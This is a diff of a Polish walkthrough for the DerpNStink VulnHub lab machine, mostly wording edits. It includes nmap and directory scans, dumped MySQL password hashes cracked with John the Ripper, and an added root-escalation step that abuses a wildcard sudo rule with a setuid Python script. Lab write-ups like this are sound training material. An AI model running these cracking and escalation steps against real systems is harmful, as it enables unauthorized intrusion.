@@ -1,7 +1,7 @@
 # DerpNStink: 1 VulnHub Machine Walkthrough (PL)
 ## Wstęp
 W poniższym walkthrough zajmiemy się podatną VM dostępną na https://www.vulnhub.com. To ciekawe wyzwanie boot2root, będzie wymagało od początkujących podejścia i działania "out-of-the-box", ponieważ zahacza o wiele różnych obszarów i tooli dla pentesterów. Uprzedzam, że zadanie zawiera kilka zagwozdek, jednak wspólnie stawimy im dzisiaj czoła i mam nadzieję będzie to dla nas wszystkich równie satysfakcjonujące! Zachęcam również do samodzielnego, dalszego eksplorowania
-wszystkich omawianych zagadnień. **Prezentowany sposób nie jest wyłącznym możliwym, a jedynie jednym z wielu.** Eksperymentowanie i wypracowanie sobie własnego sposobu hackowania jest tutaj mile widziane.
+wszystkich omawianych zagadnień. **Prezentowany sposób jest jednym z bardzo wielu możliwych.** Eksperymentowanie i wypracowanie sobie własnej drogi jest tutaj wskazane.
 Autor zostawił dla nas następującą wiadomość:
 
 
@@ -9,16 +9,15 @@ Autor zostawił dla nas następującą wiadomość:
 
 >_Example: flag1(AB0BFD73DAAEC7912DCDCA1BA0BA3D05). Do not waste time decrypting the hash in the flag as it has no value in the challenge other than an identifier_.
 
-Zamiast marnować czas, **let's cut straight to the chase**! :-)
+Zamiast marnować czas, **let's get straight to the business**! :-)
 
 ## 1. Inicjalny skan & zbieranie informacji
 
-Domyślnie serwer DHCP VirtualBox przydziela naszemu klientowi (gościowi) adres IP według wzoru: 192.168.56.x \
-W tym kroku odpalamy narzędzie **nmap** i przystępujemy do poszukania dostępnych portów i usług
+Na starcie odpalamy narzędzie **nmap** i przystępujemy do poszukania dostępnych portów i usług
 
 `nmap -sT -sV -A 192.168.56.0/24`
 ```
-Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-25 10:27 CET
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-20 10:27 CET
 Nmap scan report for 192.168.56.100
 Host is up (0.00018s latency).
 All 65535 scanned ports on 192.168.56.100 are filtered
@@ -200,7 +199,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /temporary (Status: 301)
 /server-status (Status: 403)
 ===============================================================
-2020/02/25 17:21:05 Finished                                                                                                                              
+2020/02/20 10:31:05 Finished                                                                                                                              
 =============================================================== 
 ```
 
@@ -538,7 +537,7 @@ select User,Password from user;
 +------------------+-------------------------------------------+
 7 rows in set (0.01 sec)
 ```
-Naszym targetem będzie użytkownik _unclestinky_. Zanim przystąpimy do dalszych działań, użyjemy narzędzia o nazwie **hash-identifier**. W wyniku dostajemy:
+Naszym targetem będzie użytkownik _unclestinky_. Zanim przystąpimy do dalszych działań, użyjemy narzędzia o nazwie **hash-identifier**. Dowiadujemy się, że:
 
 ```
 Possible Hashs:
@@ -546,13 +545,13 @@ Possible Hashs:
 ```
 Kolej na password cracking przy wykorzystaniu toola **John The Ripper**
 
-Zapisujemy dane do pliku _mysql_hashes.txt_ i formatujemy tekst do postaci `user:hash` (możemy zrobić to manualnie lub za pomocą kombinacji komend)
+Zapisujemy dane do pliku _mysql_hashes.txt_ i formatujemy tekst do postaci `user:hash`
 
 
-Wywołujemy **Johna** i korzystamy z gotowej listy słownikowej:<br>
-`john mysql_hash.txt --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt` <br>
+Wywołujemy **Johna** i korzystamy z gotowej listy słownikowej: \
+`john mysql_hash.txt --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt` \
 
-Wreszcie możemy zobaczyć efekty:<br>
+Wreszcie możemy zobaczyć efekty: \
 `john --show mysql_hash.txt`
 
 ```
@@ -568,7 +567,7 @@ Wykorzystajmy te dane aby zalogować się do wordpressa. Szybkie rozeznanie i tr
 
 ## 4. Uruchomienie powłoki z nowego konta
 
-W tle wciąż działa zespawnowany przez nas wcześniej shell - pora znowu go wykorzystać. 
+W tle wciąż działa zespawnowany przez nas wcześniej shell - pora znowu go wykorzystać
 
 ```
 www-data@DeRPnStiNK$ cat /etc/passwd
@@ -616,7 +615,7 @@ Password: derpderpderpderpderpderpderp
 mrderp@DeRPnStiNK:/home/stinky/Documents$ 
 ```
 Jak widać logowanie przebiegło pomyślnie :-) \
-W katalogu `Desktop` usera `mrderp` czeka na nas podejrzany plik o nazwie `helpdesk.log`
+W katalogu `Desktop` usera `mrderp` czeka na nas tajemniczy plik o nazwie `helpdesk.log`
 
 ```
 From: Help Desk
@@ -649,11 +648,23 @@ W tekście mamy podany link do strony Self Help Web. Upewnijmy się co kryje si�
 
 ![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/pastebin.png) 
 
+Wygląda zupełnie jak wskazówka, która pozwoli nam eskalować nasze uprawnienia
 
 ## 5. Eskalacja uprawnień
 
+`mrderp ALL=(ALL) /home/mrderp/binaries/derpy*`
 
+Dalej już tylko kilka kroków i podniesienie uprawnień do poziomu `root`:
+```
+$ mkdir -p /home/mrderp/binaries
+$ echo -e '#!/usr/bin/env python\nimport os\nos.setuid(0)\nos.setgid(0)\nos.system("/bin/bash/")' > /home/mrderp/binaries/derpy
+$ chmod +x /home/mrderp/binaries/derpy
+$ sudo /home/mrderp/binaries/derpy
+```
+![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/root.png)
 
+I czas na odnalezienie ostatniej flagi:
+
+![](https://github.com/d15rup7or/Labs/blob/master/DerpNStink/img/flag4.png)
 
 `flag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)`
-
